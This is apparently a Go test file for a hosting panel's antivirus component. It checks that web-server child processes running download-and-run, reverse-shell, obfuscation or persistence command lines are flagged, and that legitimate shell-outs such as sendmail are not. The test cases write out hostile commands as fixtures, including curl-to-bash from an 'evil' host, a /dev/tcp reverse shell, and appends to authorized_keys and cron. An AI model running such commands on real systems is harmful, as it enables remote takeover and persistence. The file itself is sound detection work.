package antivirus

import (
	"encoding/binary"
	"testing"
)

// A legitimate shell-out carries no download-and-run indicator, so it must not
// fire. This is the FP2 showstopper regression: the first model scored
// php-fpm -> sh, and PHP mail() runs popen("/bin/sh -c sendmail") on every mail.
func TestScoreProcessLegitimateShellOut(t *testing.T) {
	cases := []string{
		"sh -c /usr/sbin/sendmail -t -i",
		"sh -c mysqldump database",
		"sh -c /usr/bin/convert a.png b.jpg",
	}
	for _, cl := range cases {
		if f := scoreProcess(true, "/bin/sh", cl, 1000); f.score != 0 {
			t.Fatalf("legitimate shell-out fired: %q -> %+v", cl, f)
		}
	}
	if f := scoreProcess(true, "/usr/bin/php", "php /home/c_x/public_html/index.php", 1000); f.score != 0 {
		t.Fatalf("a legitimate php run fired: %+v", f)
	}
}

// A web process running a shell/interpreter with a download-and-run,
// reverse-shell or obfuscation command line is critical.
func TestScoreProcessMaliciousCmdline(t *testing.T) {
	type c struct{ exe, cl string }
	cases := []c{
		{"/bin/bash", "sh -c curl http://evil/x|bash"},
		{"/bin/bash", "bash -c wget http://evil/s -O /tmp/s; chmod +x /tmp/s"},
		{"/bin/sh", "sh -c echo payload | base64 -d | sh"},
		{"/usr/bin/php", "php -r eval(hexdec($x))"},
		{"/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"},
	}
	for _, x := range cases {
		if f := scoreProcess(true, x.exe, x.cl, 1000); f.score < procScoreCritical || f.code != reasonWebShellCmd {
			t.Fatalf("malicious cmdline not caught: %q -> %+v", x.cl, f)
		}
	}
}

// An untrusted origin (document root, volatile dir, memfd, deleted) is critical
// whatever the binary is named, so renaming a shell or dropping an ELF does not
// evade it.
func TestScoreProcessUntrustedOrigin(t *testing.T) {
	cases := map[string]string{
		"/home/c_x/public_html/.hidden": "public_html",
		"/tmp/a.out":                    "tmp",
		"/dev/shm/x":                    "shm",
		"/var/tmp/y":                    "var_tmp",
		"/memfd:stage (deleted)":        "memfd",
		"/usr/bin/python3 (deleted)":    "deleted",
	}
	for exe, wantCat := range cases {
		f := scoreProcess(true, exe, "", 1000)
		if f.score < procScoreCritical || f.code != reasonUntrustedOrigin {
			t.Fatalf("untrusted origin not caught: %q -> %+v", exe, f)
		}
		if f.category != wantCat {
			t.Fatalf("untrusted origin %q: category %q, want %q", exe, f.category, wantCat)
		}
	}
}

// A web process running a downloader against a remote URL is a warning (35),
// between the reporting threshold and critical.
func TestScoreProcessWebDownloader(t *testing.T) {
	f := scoreProcess(true, "/usr/bin/curl", "curl -s http://evil/x", 1000)
	if f.score != procScoreDownloader || f.code != reasonWebDownloader {
		t.Fatalf("web downloader: got %+v", f)
	}
	if f.score >= procScoreCritical {
		t.Fatalf("a remote download should be a warning, not critical: %d", f.score)
	}
}

// A non-web context does not fire: a tenant running a shell from their own SSH
// session is their own business.
func TestScoreProcessNotWeb(t *testing.T) {
	if f := scoreProcess(false, "/bin/bash", "bash -c curl http://x|bash", 0); f.score != 0 {
		t.Fatalf("a non-web context fired: %+v", f)
	}
	// A tenant editing their own cron over SSH is not a web context either.
	if f := scoreProcess(false, "/usr/bin/crontab", "crontab -", 1000); f.score != 0 {
		t.Fatalf("a non-web persistence edit fired: %+v", f)
	}
}

// A web process touching a persistence surface (cron, authorized_keys, a service
// enable) is critical: a php-fpm child never sets these up legitimately.
func TestScoreProcessWebPersistence(t *testing.T) {
	cases := []string{
		"sh -c crontab -",
		"sh -c echo '* * * * * /tmp/x' >> /var/spool/cron/c_x",
		"bash -c echo key >> /home/c_x/.ssh/authorized_keys",
		"sh -c systemctl enable evil.service",
		"sh -c echo payload >> /home/c_x/.bashrc",
	}
	for _, cl := range cases {
		f := scoreProcess(true, "/bin/sh", cl, 1000)
		if f.score < procScoreCritical || f.code != reasonWebPersistence {
			t.Fatalf("web persistence not caught: %q -> %+v", cl, f)
		}
	}
}

// Servika-specific: internal/apps runs a tenant's own dependency binary from
// /home/<user>/<app>/.venv/bin or node_modules/.bin. A blanket /home
// untrusted-origin rule would flag every panel-created Node or Python app. The
// document root is the only untrusted part of /home.
func TestScoreProcessLegitimateAppBinaryIsNotUntrusted(t *testing.T) {
	cases := []string{
		"/home/c_x/app/.venv/bin/gunicorn",
		"/home/c_x/app/node_modules/.bin/next",
		"/home/c_x/api/.venv/bin/uvicorn",
	}
	for _, exe := range cases {
		if f := scoreProcess(true, exe, "gunicorn -w 4 app:app", 1000); f.score != 0 {
			t.Fatalf("a legitimate app binary was flagged: %q -> %+v", exe, f)
		}
	}
}

func TestOriginCategory(t *testing.T) {
	yes := map[string]string{
		"/tmp/x":                  "tmp",
		"/dev/shm/y":              "shm",
		"/var/tmp/z":              "var_tmp",
		"/home/c_x/public_html/a": "public_html",
		"/memfd:x":                "memfd",
		"/usr/bin/x (deleted)":    "deleted",
	}
	for exe, want := range yes {
		if got := originCategory(exe); got != want {
			t.Fatalf("originCategory(%q) = %q, want %q", exe, got, want)
		}
	}
	no := []string{
		"/usr/bin/curl", "/bin/bash", "/opt/app/bin/x", "/usr/local/bin/y",
		"/home/c_x/app/.venv/bin/gunicorn", "/home/c_x/api/node_modules/.bin/next",
	}
	for _, exe := range no {
		if got := originCategory(exe); got != "" {
			t.Fatalf("originCategory(%q) = %q, want legitimate", exe, got)
		}
	}
}

func TestCmdlineSuspicious(t *testing.T) {
	if !cmdlineSuspicious("sh -c curl http://x|bash") {
		t.Fatal("curl|bash missed")
	}
	if !cmdlineSuspicious("echo x | base64 -d") {
		t.Fatal("base64 -d missed")
	}
	if cmdlineSuspicious("/usr/sbin/sendmail -t -i") {
		t.Fatal("sendmail flagged (FP2)")
	}
	if cmdlineSuspicious("mysqldump database > backup.sql") {
		t.Fatal("mysqldump flagged")
	}
}

func TestIsWebServer(t *testing.T) {
	if !isWebServer("/usr/sbin/php-fpm", "php-fpm") {
		t.Fatal("php-fpm not classified as web")
	}
	if !isWebServer("/usr/sbin/nginx", "nginx") {
		t.Fatal("nginx not classified as web")
	}
	if isWebServer("/bin/bash", "bash") {
		t.Fatal("bash classified as web")
	}
}

func TestParseStatHandlesCommWithSpacesAndParens(t *testing.T) {
	ppid, comm := parseStat("1234 ((evil) proc) S 42 100 100 0 -1")
	if comm != "(evil) proc" {
		t.Fatalf("comm parse trap: got %q", comm)
	}
	if ppid != 42 {
		t.Fatalf("ppid: got %d, want 42", ppid)
	}
}

// buildEvent builds a netlink connector message for one proc event. Layout:
// nlmsghdr(16) + cn_msg{ id.idx(4) id.val(4) seq(4) ack(4) len(2) flags(2) } +
// proc_event{ what(4) cpu(4) ts(8) } + event_data. The connector id is set
// because parseProcEvents validates it.
func buildEvent(what uint32, a, b int32) []byte {
	const total = 16 + 20 + 16 + 16
	buf := make([]byte, total)
	binary.LittleEndian.PutUint32(buf[0:], total)      // nlmsg_len
	binary.LittleEndian.PutUint32(buf[16:], cnIdxProc) // cn_msg.id.idx
	binary.LittleEndian.PutUint32(buf[20:], cnValProc) // cn_msg.id.val
	binary.LittleEndian.PutUint32(buf[36:], what)      // proc_event.what
	binary.LittleEndian.PutUint32(buf[52:], uint32(a)) // event_data[0]
	binary.LittleEndian.PutUint32(buf[60:], uint32(b)) // event_data[8]
	return buf
}

func TestParseProcEventsExec(t *testing.T) {
	evs := parseProcEvents(buildEvent(procEventExec, 4242, 0))
	if len(evs) != 1 || evs[0].kind != procEventExec || evs[0].pid != 4242 {
		t.Fatalf("exec event: %+v", evs)
	}
}

func TestParseProcEventsFork(t *testing.T) {
	evs := parseProcEvents(buildEvent(procEventFork, 100, 200))
	if len(evs) != 1 || evs[0].kind != procEventFork || evs[0].pid != 200 || evs[0].parent != 100 {
		t.Fatalf("fork event: %+v", evs)
	}
}

func TestParseProcEventsRejectsForeignConnector(t *testing.T) {
	buf := buildEvent(procEventExec, 4242, 0)
	binary.LittleEndian.PutUint32(buf[16:], 0x99) // wrong cn_msg.id.idx
	if evs := parseProcEvents(buf); len(evs) != 0 {
		t.Fatalf("a foreign connector id should yield nothing, got %+v", evs)
	}
}

func TestParseProcEventsStopsOnMalformedLength(t *testing.T) {
	buf := buildEvent(procEventExec, 4242, 0)
	binary.LittleEndian.PutUint32(buf[0:], 8) // nlLen < 16, must stop
	if evs := parseProcEvents(buf); len(evs) != 0 {
		t.Fatalf("a malformed length should yield nothing, got %+v", evs)
	}
}
